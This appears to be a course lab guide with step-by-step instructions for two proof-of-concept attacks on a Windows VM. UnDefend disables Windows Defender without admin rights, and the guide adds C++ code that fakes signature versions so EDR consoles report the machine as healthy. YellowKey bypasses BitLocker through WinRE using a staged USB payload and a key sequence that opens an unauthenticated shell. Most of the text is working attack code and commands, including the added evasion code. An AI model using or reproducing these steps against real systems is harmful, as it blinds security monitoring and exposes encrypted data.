# CSEC Assessment Completion Guide: UnDefend & YellowKey (Lab VM Edition)

This guide provides the exact step-by-step code snippets and instructions required to complete and demonstrate the **UnDefend** and **YellowKey** Proof-of-Concept (PoC) assessments directly on your Lab VM.

---

## Prerequisites: Staging the Lab VM
Before beginning either assessment, you must transfer the necessary files from your host machine to the Lab VM.

**On your Host Machine:**
1. Connect to your Lab VM (via Hyper-V, RDP, or VMware).
2. Copy the `un-defend-main` and `YellowKey-main` folders from your Host (`C:\Users\gwu07\Desktop\CSEC\`) into the VM via clipboard or shared drive.
3. For these instructions, we assume you copied them to `C:\Lab\` on the Lab VM.

---

## Assessment 1: UnDefend (Windows Defender DoS)

**Objective:** Demonstrate a Denial of Service attack against Windows Defender on the Lab VM without Administrator privileges.

### Step 1: Compilation (On the Lab VM)
You must compile the project using Microsoft Visual C++ compiler (`cl.exe`).

1. On the Lab VM, click the Start menu, search for **Developer Command Prompt for VS**, and open it.
2. Run the following commands to navigate to the source and compile it:

```cmd
:: Navigate to the directory containing UnDefend.cpp
cd C:\Lab\un-defend-main\un-defend-main

:: Compile the codebase and link against required Native API libraries
cl.exe UnDefend.cpp /link ntdll.lib advapi32.lib
```
*Verify that `UnDefend.exe` has been generated in the folder.*

### Step 2: Demonstration - Passive Mode
1. In the same command prompt (running as a Standard User, NOT admin), execute the program:   
```cmd
.\UnDefend.exe
```
2. Leave the command prompt open and running.
3. Press `Win + R`, type `windowsdefender://threat/`, and press Enter.
4. Go to **Virus & threat protection** -> **Protection updates** -> **Check for updates**.    
5. **Expected Result:** The GUI will stall or fail to apply the update because `UnDefend.exe` has locked the backup definition files (`mpavbase.lkg` / `mpavbase.vdm`).

### Step 3: Demonstration - Aggressive Mode
To trigger a complete freeze of the Defender engine, you must modify the source code to enable the "Killer Thread".

1. Open `UnDefend.cpp` in Notepad or VS Code on the Lab VM.
2. Navigate to **line 388** inside the `wmain()` function. You will see this:

```cpp
        // run in killer mode
        // WaitForSingleObject(wdkiller,INFINITE);
```

3. Modify it by **removing the comment slashes** from the `WaitForSingleObject` call:

```cpp
        // run in killer mode
        WaitForSingleObject(wdkiller,INFINITE);
```

4. Save the file.
5. In your Developer Command Prompt, recompile and execute:

```cmd
:: Recompile the modified aggressive version
cl.exe UnDefend.cpp /link ntdll.lib advapi32.lib

:: Execute it
.\UnDefend.exe
```
6. **Expected Result:** Windows Defender will become entirely unresponsive and disabled.      

### Step 4: EDR Deception (The Web Console Lie)
*Objective:* Trick the Enterprise EDR (Endpoint Detection and Response) console into reporting that Defender is fully updated and healthy, while it is actually completely disabled.

**The Concept (How it works):**
EDR agents (like CrowdStrike, SentinelOne, or Defender for Endpoint) often parse the metadata of local signature files (such as `mpavbase.vdm`) or rely on OS file locks to determine the AV engine's health, rather than actively querying the engine. 
By modifying `UnDefend.cpp`, we implemented a **Sharing Violation Splitting** attack combined with **Metadata Spoofing**:

1. **Metadata Spoofing:** Right before locking the backup definition files, the PoC opens the file and overwrites the signature version header with a massive fake version (e.g., `99.99.9999.00`).
2. **Sharing Violation Split:** We changed the `NtCreateFile` share access from `NULL` (Exclusive) to `FILE_SHARE_READ`.
   - **The EDR** asks for `GENERIC_READ`. Since we allow `FILE_SHARE_READ`, the OS grants access. The EDR reads our fake `99.99` version and reports to the web console that the machine is secure and highly updated.
   - **Windows Defender** asks for `GENERIC_WRITE` to apply the actual real updates. Since we did *not* specify `FILE_SHARE_WRITE`, the OS denies access (`ERROR_SHARING_VIOLATION`). Defender fails to update and is effectively DoS'd.

*This achieves total invisibility: The engine is broken, but the SOC's dashboard shows it as perfectly healthy.*

**Code Modification Applied:**
We modified your local `UnDefend.cpp` to binary patch the `.vdm` file and changed the file lock attributes:
```cpp
	// --- EDR SPOOFING ADDITION ---
	wchar_t* win32Path = &gbackupfile2[4]; // Skip \??\ for CreateFile
	HANDLE hSpoof = CreateFileW(win32Path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSpoof != INVALID_HANDLE_VALUE) {
		char fakeVersion[] = "99.99.9999.00";
		DWORD written = 0;
		SetFilePointer(hSpoof, 0x20, NULL, FILE_BEGIN); // Conceptual version offset
		WriteFile(hSpoof, fakeVersion, sizeof(fakeVersion), &written, NULL);
		CloseHandle(hSpoof);
	}
	// -----------------------------

	if (!hlock1)
		// Changed ShareAccess from NULL to FILE_SHARE_READ
		ntstat = NtCreateFile(&hlock1, GENERIC_READ | SYNCHRONIZE | GENERIC_EXECUTE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT, NULL, NULL);

	// ...
		// Changed LockFileEx from Exclusive to Shared (0)
		LockFileEx(hlock1, 0, NULL, li.LowPart, li.HighPart, &ov);
```
*(You can compile this exact modified version using the Step 1 compilation command to test this deception on your lab VM!)*

---

## Assessment 2: YellowKey (BitLocker Bypass)

**Objective:** Demonstrate an offline, physical bypass of BitLocker utilizing a logic flaw within the Windows Recovery Environment (WinRE) on a Windows 11 Lab VM.

### Step 1: Drive Preparation (On your Host Machine)
You need to copy the `FsTx` folder to a hidden system directory on a USB drive. PowerShell makes this easy.

1. Plug a USB drive into your Host Machine. Note the drive letter (e.g., `E:`).
2. Open PowerShell as Administrator on your Host Machine.
3. Run the following snippet, replacing `E:` with your actual USB drive letter:

```powershell
# Define paths
$USB_DRIVE = "E:"
$SRC_DIR = "C:\Users\gwu07\Desktop\CSEC\YellowKey-main\YellowKey-main\FsTx"
$DEST_DIR = "$USB_DRIVE\System Volume Information\FsTx"

# Force creation of the hidden System Volume Information folder (if missing)
New-Item -ItemType Directory -Force -Path "$USB_DRIVE\System Volume Information"

# Recursively copy the FsTx payload into the hidden directory
Copy-Item -Path $SRC_DIR -Destination $DEST_DIR -Recurse -Force

Write-Host "USB successfully staged with YellowKey payload." -ForegroundColor Green
```

### Step 2: Boot Execution (On the Lab VM)
1. **Connect the USB drive** to the Lab VM (use Hyper-V/VMware settings to attach the physical USB device to the VM).
2. Boot the Lab VM to the Windows login screen.
3. Hold down the **SHIFT** key on your physical keyboard.
4. Click the Power Icon on the screen and select **Restart**.
5. **The Timing Sequence (Crucial):**
   - The exact moment you click Restart, **release the SHIFT key**.
   - **Immediately press and HOLD the CTRL key.**
   - **Do NOT let go** of the CTRL key while the VM reboots into the Windows Recovery Environment (WinRE).

### Step 3: Demonstration
1. Because the vulnerable WinRE agent loaded the malicious `FsTx` component from your USB drive, the standard BitLocker recovery prompt will be bypassed.
2. **Expected Result:** An unauthenticated `cmd.exe` terminal window will spawn on the screen.
3. In this terminal, execute:
```cmd
C:
dir
```
*(If Windows is mapped to D: in WinRE, type `D:` instead).*
4. You will see the contents of the BitLocker-protected drive in plain text, successfully demonstrating the bypass.